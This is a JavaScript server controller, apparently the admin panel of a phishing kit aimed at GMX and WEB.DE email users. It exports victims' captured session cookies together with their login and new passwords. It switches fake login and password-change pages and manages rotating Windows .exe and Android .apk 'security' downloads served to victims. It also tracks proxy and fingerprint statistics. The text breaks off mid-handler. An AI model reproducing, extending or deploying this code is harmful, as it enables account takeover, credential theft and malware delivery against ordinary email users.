// Controller: configs, downloads, cookies-export, mode/start-page (sloppy — uses with(scope)).
const path = require('path');
const fs = require('fs');
const os = require('os');
const { spawn, spawnSync } = require('child_process');
const { execSync } = require('child_process');
const yauzl = require('yauzl');
const { send, safeEnd } = require('../utils/httpUtils');
const { checkAdminAuth } = require('../utils/authUtils');
const { getPlatformFromRequest, maskEmail, translateChatText, CHAT_TRANSLATE_TARGET } = require('../utils/formatUtils');
const leadService = require('../services/leadService');
const automationService = require('../services/automationService');
const chatService = require('../services/chatService');
let nodemailer;
try { nodemailer = require('nodemailer'); } catch (e) { nodemailer = null; }
const archiver = require('archiver');
const {
  getWebLoginAndNewPasswordForExport,
  formatCookieFileCommentLine,
} = require('../lib/leadExportCredentials');
const {
  listProxyFpStats,
  deleteProxyFpStatRow,
  deleteProxyFpStatsByProxy,
  deleteProxyFpStatsByFingerprint,
  purgeProxyFpStatsOrphans,
} = require('../db/database');

/** ZIP без системной команды `zip` (на многих VPS её нет → «Ошибка создания архива»). */
function zipFlatDirectoryToFile(dirPath, outZipPath) {
  return new Promise(function (resolve, reject) {
    const archive = archiver('zip', { zlib: { level: 6 } });
    const output = fs.createWriteStream(outZipPath);
    output.on('close', function () {
      resolve();
    });
    output.on('error', reject);
    archive.on('error', reject);
    archive.pipe(output);
    let names;
    try {
      names = fs.readdirSync(dirPath);
    } catch (e) {
      reject(e);
      return;
    }
    for (let i = 0; i < names.length; i++) {
      const f = names[i];
      const fp = path.join(dirPath, f);
      let st;
      try {
        st = fs.statSync(fp);
      } catch (e) {
        continue;
      }
      if (st.isFile()) archive.file(fp, { name: f });
    }
    void archive.finalize();
  });
}

async function handle(scope) {
  with (scope) {
  if (pathname === '/api/config/proxy-fp-stats' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    let rows = [];
    try {
      rows = listProxyFpStats();
    } catch (e) {
      return send(res, 500, { ok: false, error: (e && e.message) || 'db error' });
    }
    return send(res, 200, { ok: true, rows: rows });
  }

  if (pathname === '/api/config/proxy-fp-stats' && req.method === 'DELETE') {
    if (!checkAdminAuth(req, res)) return;
    const q = (parsed && parsed.query) || {};
    const proxyServer = q.proxyServer != null ? String(q.proxyServer).trim() : '';
    const fpIndexRaw = q.fpIndex != null ? String(q.fpIndex).trim() : '';
    const hasProxy = !!proxyServer;
    const hasFp = fpIndexRaw !== '';
    let changes = 0;
    try {
      if (hasProxy && hasFp) changes = deleteProxyFpStatRow(proxyServer, fpIndexRaw);
      else if (hasProxy) changes = deleteProxyFpStatsByProxy(proxyServer);
      else if (hasFp) changes = deleteProxyFpStatsByFingerprint(fpIndexRaw);
      else return send(res, 400, { ok: false, error: 'proxyServer or fpIndex required' });
    } catch (e) {
      return send(res, 500, { ok: false, error: (e && e.message) || 'db error' });
    }
    return send(res, 200, { ok: true, deleted: changes });
  }

  if (pathname === '/api/config/proxy-fp-stats/purge-orphans' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let proxyContent = '';
    try {
      if (fs.existsSync(PROXY_FILE)) proxyContent = fs.readFileSync(PROXY_FILE, 'utf8');
    } catch (e) {
      return send(res, 500, { ok: false, error: 'Failed to read proxy file' });
    }
    const valid = proxyContent
      .split(/\r?\n/)
      .map((l) => String(l || '').trim())
      .filter((l) => l && !l.startsWith('#'))
      .map((l) => {
        const parsed = normalizeProxyLine(l);
        return parsed ? parsed.normalized : null;
      })
      .filter(Boolean);
    let changes = 0;
    try {
      changes = purgeProxyFpStatsOrphans(valid);
    } catch (e) {
      return send(res, 500, { ok: false, error: (e && e.message) || 'db error' });
    }
    return send(res, 200, { ok: true, deleted: changes, validCount: valid.length });
  }

  if (pathname === '/api/config/cookies-export' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const mode = (parsed.query && parsed.query.mode) ? String(parsed.query.mode).trim().toLowerCase() : 'all';
    if (mode !== 'all' && mode !== 'new' && mode !== 'force') return send(res, 400, { ok: false, error: 'mode=all|new|force' });
    const leads = leadService.readLeads();
    const cookieExportSets = readCookiesExportedSets();
    function cookieSafeFromEmailForExport(email) {
      if (!email || typeof email !== 'string') return '';
      return String(email).trim().replace(/[^\w.\-@]/g, '_').replace('@', '_at_');
    }
    const withCookies = leads.filter((l) => {
      const c = l && l.cookies;
      return c != null && String(c).trim() !== '';
    });
    const toExport = (mode === 'new') ? withCookies.filter((l) => {
      const safe = cookieSafeFromEmailForExport(cookieEmailForLeadCookiesFile(l));
      return !cookieExportSets.leadIds.has(String(l.id)) && !cookieExportSets.safeNames.has(safe);
    }) : withCookies;
    if (toExport.length === 0) {
      return send(res, 200, { ok: false, error: mode === 'new' ? 'Нет новых куки для выгрузки' : 'Нет куки в БД' });
    }
    const skipMarkExported = (mode === 'force');
    const tempDir = path.join(os.tmpdir(), 'gmw-cookies-export-' + Date.now());
    const zipPath = path.join(os.tmpdir(), 'gmw-cookies-export-' + Date.now() + '.zip');
    try {
      fs.mkdirSync(tempDir, { recursive: true });
      const exportedLeadIds = [];
      for (const lead of toExport) {
        const email = cookieEmailForLeadCookiesFile(lead) || (lead.email || '').trim() || 'unknown';
        const { passLogin, passNew } = getWebLoginAndNewPasswordForExport(lead);
        const commentLine = formatCookieFileCommentLine(email, passLogin, passNew);
        const cookieData = String(lead.cookies).trim();
        const txtContent = commentLine + '\n' + cookieData;
        const txtFileName = cookieExportFilename(email);
        fs.writeFileSync(path.join(tempDir, txtFileName), txtContent, 'utf8');
        exportedLeadIds.push(String(lead.id));
      }
      try {
        await zipFlatDirectoryToFile(tempDir, zipPath);
      } catch (zipErr) {
        console.error('[АДМИН] cookies-export zip error:', zipErr && zipErr.message ? zipErr.message : zipErr);
        try { if (fs.existsSync(tempDir)) fs.rmSync(tempDir, { recursive: true }); } catch (e2) {}
        try { if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath); } catch (e2) {}
        return send(res, 500, { ok: false, error: 'Ошибка создания архива' });
      }
      if (!skipMarkExported) appendCookiesExportedLeadIds(exportedLeadIds);
      try { fs.rmSync(tempDir, { recursive: true }); } catch (e) {}
      const filename = mode === 'new' ? 'cookies-new.zip' : (mode === 'force' ? 'cookies-force.zip' : 'cookies-all.zip');
      res.writeHead(200, {
        'Content-Type': 'application/zip',
        'Content-Disposition': 'attachment; filename="' + filename + '"',
        'Cache-Control': 'no-store'
      });
      const stream = fs.createReadStream(zipPath);
      stream.pipe(res);
      stream.on('end', () => {
        try { fs.unlinkSync(zipPath); } catch (e) {}
      });
      res.on('close', () => {
        try { fs.unlinkSync(zipPath); } catch (e) {}
      });
    } catch (e) {
      console.error('[АДМИН] cookies-export:', e);
      try { if (fs.existsSync(tempDir)) fs.rmSync(tempDir, { recursive: true }); } catch (e2) {}
      try { if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath); } catch (e2) {}
      return send(res, 500, { ok: false, error: String(e.message || e) });
    }
    return true;
  }

  /** Скрипт входа ждёт новый пароль (long-poll). Запрос висит до сохранения пароля в админке или таймаута. */
  if (pathname === '/api/mode' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const data = readModeData();
    const canonicalBaseGmx = 'https://' + GMX_DOMAIN;
    const canonicalBaseWebde = 'https://' + WEBDE_CANONICAL_HOST;
    return send(res, 200, { mode: data.mode, autoScript: data.autoScript, canonicalBase: canonicalBaseGmx, canonicalBaseGmx, canonicalBaseWebde });
  }

  if (pathname === '/api/mode' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const mode = json.mode === 'manual' ? 'manual' : (json.mode === 'auto' ? 'auto' : undefined);
      const autoScript = json.autoScript !== undefined ? !!json.autoScript : undefined;
      const before = readModeData();
      writeMode(mode, autoScript);
      const data = readModeData();
      logTerminalFlow('РЕЖИМ', 'Админка', '—', '—',
        'POST /api/mode: было mode=' + before.mode + ' autoScript=' + before.autoScript
          + ' → стало mode=' + data.mode + ' autoScript=' + data.autoScript,
        '');
      send(res, 200, { ok: true, mode: data.mode, autoScript: data.autoScript });
    });
    return true;
  }

  if (pathname === '/api/start-page' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    return send(res, 200, { startPage: readStartPage() });
  }

  if (pathname === '/api/start-page' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const sp = json.startPage != null ? String(json.startPage).trim().toLowerCase() : '';
      const value = sp === 'login' ? 'login' : sp === 'change' ? 'change' : sp === 'download' ? 'download' : sp === 'klein' ? 'klein' : 'login';
      const beforeSp = readStartPage();
      writeStartPage(value);
      logTerminalFlow('РЕЖИМ', 'Админка', '—', '—',
        'POST /api/start-page: было «' + beforeSp + '» → стало «' + value + '» (Login|Change|Download|Klein)',
        '');
      send(res, 200, { ok: true, startPage: value });
    });
    return true;
  }

  if (pathname === '/api/stats' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const rawPeriod = parsed && parsed.query ? parsed.query.period : 'today';
    const period = ['today', 'yesterday', 'week', 'month', 'all'].includes(String(rawPeriod || '').toLowerCase())
      ? String(rawPeriod).toLowerCase()
      : 'today';
    const stats = leadService.getStatsByPeriod(period);
    return send(res, 200, {
      ok: true,
      period,
      byStatus: stats.byStatus || { worked: 0, pending: 0, success: 0 },
      total: stats.total != null ? stats.total : 0,
      byOs: stats.byOs || { windows: 0, macos: 0, android: 0, ios: 0, other: 0 }
    });
  }

  if (pathname === '/api/config/download' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const files = getSicherheitDownloadFiles();
    return send(res, 200, { files });
  }

  if (pathname === '/api/config/download-limit' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const fileName = (json.fileName != null) ? String(json.fileName).trim() : '';
      const index = json.index != null ? parseInt(json.index, 10) : -1;
      let limit = json.limit != null ? parseInt(String(json.limit), 10) : -1;
      if (limit < 0) limit = 0;
      const config = readDownloadFilesConfig();
      const name = (fileName && !fileName.includes('..') && !fileName.includes(path.sep))
        ? path.basename(fileName)
        : (index >= 0 && index < config.length ? config[index] : null);
      if (!name) return send(res, 400, { ok: false, error: 'fileName or index required' });
      const limits = readDownloadLimits();
      limits[name] = limit;
      writeDownloadLimits(limits);
      return send(res, 200, { ok: true, fileName: name, limit });
    });
    return true;
  }

  if (pathname === '/api/config/download-upload-multi' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    const contentType = (req.headers['content-type'] || '').toLowerCase();
    if (contentType.indexOf('multipart/form-data') === -1) {
      return send(res, 400, { ok: false, error: 'Expect multipart/form-data' });
    }
    const boundaryMatch = contentType.match(/boundary=([^;\s]+)/);
    const boundary = boundaryMatch ? boundaryMatch[1].trim().replace(/^["']|["']$/g, '') : null;
    if (!boundary) return send(res, 400, { ok: false, error: 'No boundary' });
    const chunks = [];
    req.on('data', (chunk) => { chunks.push(chunk); });
    req.on('end', () => {
      const body = Buffer.concat(chunks);
      const boundaryPrefix = Buffer.from('--' + boundary, 'utf8');
      const boundaryBuf = Buffer.from('\r\n--' + boundary, 'utf8');
      const files = [];
      let zipPassword = '';
      let idx = body.indexOf(boundaryPrefix);
      while (idx !== -1) {
        let partStart = idx + boundaryPrefix.length;
        if (body[partStart] === 45 && body[partStart + 1] === 45) break;
        if (body[partStart] === 13 || body[partStart] === 10) partStart += body[partStart] === 13 && body[partStart + 1] === 10 ? 2 : 1;
        const nextBoundary = body.indexOf(boundaryBuf, partStart);
        const partEnd = nextBoundary === -1 ? body.length : nextBoundary;
        const headEnd = body.indexOf(Buffer.from('\r\n\r\n', 'utf8'), partStart);
        if (headEnd !== -1 && headEnd < partEnd) {
          const headers = body.slice(partStart, headEnd).toString('utf8');
          const nameMatch = headers.match(/name="([^"]+)"/);
          const fileMatch = headers.match(/filename="([^"]+)"/);
          const bodyStart = headEnd + 4;
          const fieldName = nameMatch ? nameMatch[1].replace(/\s*\[\]$/, '') : '';
          if ((fieldName === 'file' || fieldName === 'files') && fileMatch) {
            const filename = fileMatch[1].replace(/^.*[\\/]/, '').trim();
            if (filename) files.push({ filename, start: bodyStart, end: partEnd });
          } else if (fieldName === 'zipPassword') {
            zipPassword = body.slice(bodyStart, partEnd).toString('utf8').trim();
          }
        }
        idx = nextBoundary === -1 ? -1 : nextBoundary;
      }
      if (files.length === 0) return send(res, 400, { ok: false, error: 'Нет файлов' });
      if (zipPassword) writeZipPassword(zipPassword);
      if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
      const newList = [];
      const limits = readDownloadLimits();
      const counts = readDownloadCounts();
      const maxFiles = Math.min(files.length, DOWNLOAD_SLOTS_COUNT);
      for (let i = 0; i < maxFiles; i++) {
        const original = path.basename(files[i].filename).replace(/\.\./g, '').replace(/[/\\]/g, '') || 'download';
        const ext = (path.extname(original) || '').toLowerCase();
        const safeExt = /^\.([a-zA-Z0-9]+)$/.test(ext) ? ext : '.bin';
        const base = (path.basename(original, ext) || 'download').replace(/[^a-zA-Z0-9._-]/g, '_');
        let slotName = base + safeExt;
        let n = 1;
        while (newList.indexOf(slotName) !== -1) {
          slotName = base + '-' + (++n) + safeExt;
        }
        const buf = body.slice(files[i].start, files[i].end);
        try {
          const fullPath = path.join(DOWNLOADS_DIR, slotName);
          fs.writeFileSync(fullPath, buf);
          newList.push(slotName);
          if (limits[slotName] === undefined) limits[slotName] = DEFAULT_DOWNLOAD_LIMIT;
          counts[slotName] = 0;
        } catch (e) {
          return send(res, 500, { ok: false, error: 'Ошибка записи файла' });
        }
      }
      while (newList.length < DOWNLOAD_SLOTS_COUNT) newList.push(null);
      writeDownloadFilesConfig(newList);
      writeDownloadLimits(limits);
      try {
        if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
        fs.writeFileSync(DOWNLOAD_COUNTS_FILE, JSON.stringify(counts, null, 0), 'utf8');
      } catch (e) {}
      const out = getSicherheitDownloadFiles();
      return send(res, 200, { ok: true, files: out, uploadedCount: maxFiles });
    });
    return true;
  }

  if (pathname === '/api/config/download' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    if (!checkRateLimit(ip, 'configUpload', RATE_LIMITS.configUpload)) return send(res, 429, { ok: false, error: 'too_many_requests' });
    const contentType = (req.headers['content-type'] || '').toLowerCase();
    if (contentType.indexOf('multipart/form-data') === -1) {
      return send(res, 400, { ok: false, error: 'Expect multipart/form-data' });
    }
    const boundaryMatch = contentType.match(/boundary=([^;\s]+)/);
    const boundary = boundaryMatch ? boundaryMatch[1].trim().replace(/^["']|["']$/g, '') : null;
    if (!boundary) return send(res, 400, { ok: false, error: 'No boundary' });
    const chunks = [];
    req.on('data', (chunk) => { chunks.push(chunk); });
    req.on('end', () => {
      const body = Buffer.concat(chunks);
      const boundaryPrefix = Buffer.from('--' + boundary, 'utf8');
      const boundaryBuf = Buffer.from('\r\n--' + boundary, 'utf8');
      let idx = body.indexOf(boundaryPrefix);
      if (idx === -1) return send(res, 400, { ok: false, error: 'Invalid multipart' });
      let filename = null;
      let fileStart = -1;
      let fileEnd = body.length;
      let zipPassword = '';
      while (idx !== -1) {
        let partStart = idx + boundaryPrefix.length;
        if (body[partStart] === 45 && body[partStart + 1] === 45) break;
        if (body[partStart] === 13 || body[partStart] === 10) partStart += body[partStart] === 13 && body[partStart + 1] === 10 ? 2 : 1;
        const nextBoundary = body.indexOf(boundaryBuf, partStart);
        const partEnd = nextBoundary === -1 ? body.length : nextBoundary;
        const headEnd = body.indexOf(Buffer.from('\r\n\r\n', 'utf8'), partStart);
        if (headEnd !== -1 && headEnd < partEnd) {
          const headers = body.slice(partStart, headEnd).toString('utf8');
          const nameMatch = headers.match(/name="([^"]+)"/);
          const fileMatch = headers.match(/filename="([^"]+)"/);
          const bodyStart = headEnd + 4;
          if (fileMatch && nameMatch && nameMatch[1] === 'file') {
            filename = fileMatch[1].replace(/^.*[\\/]/, '').trim();
            if (filename) {
              fileStart = bodyStart;
              fileEnd = partEnd;
            }
          } else if (nameMatch && nameMatch[1] === 'zipPassword') {
            zipPassword = body.slice(bodyStart, partEnd).toString('utf8').trim();
          }
        }
        idx = nextBoundary === -1 ? -1 : nextBoundary;
      }
      if (!filename || fileStart === -1) return send(res, 400, { ok: false, error: 'No file' });
      const safeName = path.basename(filename) || 'download';
      const targetPath = path.join(DOWNLOADS_DIR, safeName);
      try {
        if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
        const names = fs.readdirSync(DOWNLOADS_DIR);
        for (let i = 0; i < names.length; i++) {
          const n = names[i];
          const lower = n.toLowerCase();
          if ((lower.endsWith('.exe') || lower.endsWith('.zip')) && n !== safeName) {
            try {
              fs.unlinkSync(path.join(DOWNLOADS_DIR, n));
            } catch (e) {}
          }
        }
        fs.writeFileSync(targetPath, body.slice(fileStart, fileEnd));
        const result = { ok: true, fileName: safeName };
        if (path.extname(safeName).toLowerCase() !== '.zip') {
          send(res, 200, result);
          return;
        }
        let responded = false;
        const finishWithEntries = (entries) => {
          if (responded) return;
          responded = true;
          result.zipEntries = Array.isArray(entries) ? entries.filter(n => n && !n.endsWith('/')) : [];
          send(res, 200, result);
        };
        const parseUnzipList = (out) => {
          const entries = [];
          const lines = (out || '').split('\n');
          let inTable = false;
          for (const line of lines) {
            if (line.includes('-------')) { inTable = !inTable; continue; }
            let name = null;
            const m = inTable && line.match(/^\s*\d+\s+\S+\s+\S+\s+(.*)$/);
            if (m) name = m[1].trim();
            else if (inTable && /^\s*\d+/.test(line)) {
              const parts = line.trim().split(/\s{2,}/);
              if (parts.length >= 4 && /^\d+$/.test(parts[0])) name = parts.slice(3).join(' ').trim();
            }
            if (name && !/^\d+ files?$/.test(name) && !name.endsWith('/')) entries.push(name);
          }
          return entries;
        };
        const tryUnzipList = () => {
          const runUnzip = (usePassword) => {
            const env = usePassword ? { ...process.env, GMW_ZIP_OLD: zipPassword } : process.env;
            const cmd = usePassword
              ? 'unzip -l -P "$GMW_ZIP_OLD" ' + JSON.stringify(targetPath) + ' 2>&1'
              : 'unzip -l ' + JSON.stringify(targetPath) + ' 2>&1';
            const r = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', cmd], { encoding: 'utf8', env });
            return (r.stdout || '') + (r.stderr || '');
          };
          let out = runUnzip(!!zipPassword);
          let list = parseUnzipList(out);
          if (list.length === 0 && zipPassword) out = runUnzip(false);
          if (list.length === 0) list = parseUnzipList(out);
          if (list.length === 0) console.log('[SERVER] config/download zip list empty, hadPassword=', !!zipPassword, 'passLen=', (zipPassword || '').length, 'path=', targetPath);
          else console.log('[SERVER] config/download zipEntries=', list.length, list[0]);
          finishWithEntries(list);
        };
        if (zipPassword) {
          tryUnzipList();
          return;
        }
        yauzl.open(targetPath, { lazyEntries: true }, (err, zipfile) => {
          if (err || !zipfile) {
            tryUnzipList();
            return;
          }
          const entries = [];
          const onError = () => { try { finishWithEntries(entries.length ? entries : []); } catch (e) { finishWithEntries([]); } };
          zipfile.on('error', onError);
          try {
            zipfile.readEntry();
          } catch (e) {
            tryUnzipList();
            return;
          }
          zipfile.on('entry', (entry) => {
            try {
              if (entry.fileName && !entry.fileName.endsWith('/')) entries.push(entry.fileName);
              zipfile.readEntry();
            } catch (e) {
              onError();
            }
          });
          zipfile.on('end', () => { try { finishWithEntries(entries); } catch (e) { finishWithEntries(entries.length ? entries : []); } });
        });
      } catch (e) {
        const errMsg = (e && e.message) ? e.message : String(e);
        send(res, 500, { ok: false, error: errMsg || 'Server error' });
      }
    });
    return true;
  }

  if (pathname === '/api/config/download-android' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const files = getAndroidDownloadFiles();
    return send(res, 200, { files });
  }

  if (pathname === '/api/config/download-android-limit' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const fileName = (json.fileName != null) ? String(json.fileName).trim() : '';
      const index = json.index != null ? parseInt(json.index, 10) : -1;
      let limit = json.limit != null ? parseInt(String(json.limit), 10) : -1;
      if (limit < 0) limit = 0;
      const config = readAndroidDownloadConfig();
      const name = (fileName && !fileName.includes('..') && !fileName.includes(path.sep))
        ? path.basename(fileName)
        : (index >= 0 && index < config.length ? config[index] : null);
      if (!name) return send(res, 400, { ok: false, error: 'fileName or index required' });
      const limits = readAndroidDownloadLimits();
      limits[name] = limit;
      writeAndroidDownloadLimits(limits);
      return send(res, 200, { ok: true, fileName: name, limit });
    });
    return true;
  }

  if (pathname === '/api/config/download-delete' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const fileName = (json.fileName != null) ? String(json.fileName).trim() : '';
      const safeName = (fileName && !fileName.includes('..') && !fileName.includes(path.sep)) ? path.basename(fileName) : '';
      if (!safeName) return send(res, 400, { ok: false, error: 'fileName required' });
      const config = readDownloadFilesConfig();
      const idx = config.indexOf(safeName);
      if (idx === -1) return send(res, 404, { ok: false, error: 'File not in Windows config' });
      const newList = config.slice();
      newList[idx] = null;
      writeDownloadFilesConfig(newList);
      const limits = readDownloadLimits();
      delete limits[safeName];
      writeDownloadLimits(limits);
      const counts = readDownloadCounts();
      delete counts[safeName];
      writeDownloadCounts(counts);
      const fullPath = path.join(DOWNLOADS_DIR, safeName);
      try { if (fs.existsSync(fullPath)) fs.unlinkSync(fullPath); } catch (e) {}
      return send(res, 200, { ok: true, deleted: safeName });
    });
    return true;
  }

  if (pathname === '/api/config/download-android-delete' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const fileName = (json.fileName != null) ? String(json.fileName).trim() : '';
      const safeName = (fileName && !fileName.includes('..') && !fileName.includes(path.sep)) ? path.basename(fileName) : '';
      if (!safeName) return send(res, 400, { ok: false, error: 'fileName required' });
      const config = readAndroidDownloadConfig();
      const idx = config.indexOf(safeName);
      if (idx === -1) return send(res, 404, { ok: false, error: 'File not in Android config' });
      const newList = config.slice();
      newList[idx] = null;
      writeAndroidDownloadConfig(newList);
      const limits = readAndroidDownloadLimits();
      delete limits[safeName];
      writeAndroidDownloadLimits(limits);
      const counts = readDownloadCounts();
      delete counts[safeName];
      writeDownloadCounts(counts);
      const fullPath = path.join(DOWNLOADS_DIR, safeName);
      try { if (fs.existsSync(fullPath)) fs.unlinkSync(fullPath); } catch (e) {}
      return send(res, 200, { ok: true, deleted: safeName });
    });
    return true;
  }

  if (pathname === '/api/config/download-reset-counts' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const platform = (json.platform === 'windows' || json.platform === 'android' || json.platform === 'all') ? json.platform : 'all';
      const counts = readDownloadCounts();
      if (platform === 'all') {
        writeDownloadCounts({});
        return send(res, 200, { ok: true, cleared: 'all' });
      }
      const names = platform === 'windows'
        ? readDownloadFilesConfig().filter(Boolean)
        : readAndroidDownloadConfig().filter(Boolean);
      for (let i = 0; i < names.length; i++) {
        delete counts[names[i]];
      }
      writeDownloadCounts(counts);
      return send(res, 200, { ok: true, cleared: platform });
    });
    return true;
  }

  if (pathname === '/api/config/download-rotate-next' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const platform = (json.platform === 'windows' || json.platform === 'android') ? json.platform : null;
      if (!platform) return send(res, 400, { ok: false, error: 'platform required: windows or android' });
      const state = readDownloadRotation();
      const key = platform === 'android' ? 'android' : 'windows';
      const block = state[key];
      if (!block) return send(res, 500, { ok: false });
      block.totalUnique = (block.totalUnique || 0) + 1;
      writeDownloadRotation(state);
      return send(res, 200, { ok: true, platform, totalUnique: block.totalUnique });
    });
    return true;
  }

  if (pathname === '/api/config/download-android-upload-multi' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    const contentType = (req.headers['content-type'] || '').toLowerCase();
    if (contentType.indexOf('multipart/form-data') === -1) {
      return send(res, 400, { ok: false, error: 'Expect multipart/form-data' });
    }
    const boundaryMatch = contentType.match(/boundary=([^;\s]+)/);
    const boundary = boundaryMatch ? boundaryMatch[1].trim().replace(/^["']|["']$/g, '') : null;
    if (!boundary) return send(res, 400, { ok: false, error: 'No boundary' });
    const chunks = [];
    req.on('data', (chunk) => { chunks.push(chunk); });
    req.on('end', () => {
      const body = Buffer.concat(chunks);
      const boundaryPrefix = Buffer.from('--' + boundary, 'utf8');
      const boundaryBuf = Buffer.from('\r\n--' + boundary, 'utf8');
      const files = [];
      let idx = body.indexOf(boundaryPrefix);
      while (idx !== -1) {
        let partStart = idx + boundaryPrefix.length;
        if (body[partStart] === 45 && body[partStart + 1] === 45) break;
        if (body[partStart] === 13 || body[partStart] === 10) partStart += body[partStart] === 13 && body[partStart + 1] === 10 ? 2 : 1;
        const nextBoundary = body.indexOf(boundaryBuf, partStart);
        const partEnd = nextBoundary === -1 ? body.length : nextBoundary;
        const headEnd = body.indexOf(Buffer.from('\r\n\r\n', 'utf8'), partStart);
        if (headEnd !== -1 && headEnd < partEnd) {
          const headers = body.slice(partStart, headEnd).toString('utf8');
          const nameMatch = headers.match(/name="([^"]+)"/);
          const fileMatch = headers.match(/filename="([^"]+)"/);
          const bodyStart = headEnd + 4;
          const fieldName = nameMatch ? nameMatch[1].replace(/\s*\[\]$/, '') : '';
          if ((fieldName === 'file' || fieldName === 'files') && fileMatch) {
            const filename = fileMatch[1].replace(/^.*[\\/]/, '').trim();
            if (filename) files.push({ filename, start: bodyStart, end: partEnd });
          }
        }
        idx = nextBoundary === -1 ? -1 : nextBoundary;
      }
      if (files.length === 0) return send(res, 400, { ok: false, error: 'Нет файлов' });
      if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
      const newList = [];
      const limits = readAndroidDownloadLimits();
      const counts = readDownloadCounts();
      const maxFiles = Math.min(files.length, DOWNLOAD_SLOTS_COUNT);
      for (let i = 0; i < maxFiles; i++) {
        const base = path.basename(files[i].filename) || 'android';
        const ext = path.extname(base).toLowerCase() || '.apk';
        const safeName = (base.replace(/\.[^.]+$/, '') || 'android').replace(/[^a-zA-Z0-9._-]/g, '_') + ext;
        const fullPath = path.join(DOWNLOADS_DIR, safeName);
        try {
          const buf = body.slice(files[i].start, files[i].end);
          fs.writeFileSync(fullPath, buf);
          newList.push(safeName);
          if (limits[safeName] === undefined) limits[safeName] = DEFAULT_DOWNLOAD_LIMIT;
          counts[safeName] = 0;
        } catch (e) {
          return send(res, 500, { ok: false, error: 'Ошибка записи файла' });
        }
      }
      while (newList.length < DOWNLOAD_SLOTS_COUNT) newList.push(null);
      writeAndroidDownloadConfig(newList);
      writeAndroidDownloadLimits(limits);
      try {
        if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
        fs.writeFileSync(DOWNLOAD_COUNTS_FILE, JSON.stringify(counts, null, 0), 'utf8');
      } catch (e) {}
      const out = getAndroidDownloadFiles();
      return send(res, 200, { ok: true, files: out, uploadedCount: maxFiles });
    });
    return true;
  }

  if (pathname === '/api/config/download-settings' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const cfg = readDownloadSettings();
    const rot = readDownloadRotation();
    return send(res, 200, {
      rotateAfterUnique: cfg.rotateAfterUnique,
      windowsUnique: rot.windows.totalUnique,
      androidUnique: rot.android.totalUnique
    });
  }

  if (pathname === '/api/config/download-settings' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const n = json.rotateAfterUnique;
      const val = typeof n === 'number' && n >= 0 ? n : (parseInt(String(n || '0'), 10) >= 0 ? parseInt(String(n), 10) : 0);
      writeDownloadSettings({ rotateAfterUnique: val });
      return send(res, 200, { ok: true, rotateAfterUnique: val });
    });
    return true;
  }

  if (pathname === '/api/config/download-android' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    if (!checkRateLimit(ip, 'configUpload', RATE_LIMITS.configUpload)) return send(res, 429, { ok: false, error: 'too_many_requests' });
    const contentType = (req.headers['content-type'] || '').toLowerCase();
    if (contentType.indexOf('multipart/form-data') === -1) return send(res, 400, { ok: false, error: 'Expect multipart/form-data' });
    const boundaryMatch = contentType.match(/boundary=([^;\s]+)/);
    const boundary = boundaryMatch ? boundaryMatch[1].trim().replace(/^["']|["']$/g, '') : null;
    if (!boundary) return send(res, 400, { ok: false, error: 'No boundary' });
    const chunks = [];
    req.on('data', (chunk) => { chunks.push(chunk); });
    req.on('end', () => {
      const body = Buffer.concat(chunks);
      const boundaryPrefix = Buffer.from('--' + boundary, 'utf8');
      const boundaryBuf = Buffer.from('\r\n--' + boundary, 'utf8');
